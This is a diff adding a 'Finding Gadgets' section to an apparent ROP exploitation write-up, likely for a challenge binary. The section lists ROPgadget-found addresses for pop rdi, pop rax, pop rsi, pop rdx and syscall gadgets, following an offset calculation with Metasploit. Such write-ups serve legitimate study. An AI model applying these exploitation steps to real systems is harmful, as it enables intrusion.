@@ -74,6 +74,16 @@ To calculate the offset copy and past the value is RSP to Metasploit pattern_off
 
 ![source-01](/img/ropv2-6.PNG){: .align-left}
 
+#### Finding Gadgets
+
+I used ROPGadget tool to find the gadgets.
+
+pop_rdi_ret = 0x000000000040142b # pop rdi ; ret
+syscall = 0x0000000000401168 # syscall
+pop_rax = 0x0000000000401162 # pop rax ; ret
+pop_rsi_r15 = 0x0000000000401429 # pop rsi ; pop r15 ; ret
+pop_rdx_r13 = 0x0000000000401164 # pop rdx ; pop r13 ; ret
+
 
 
 
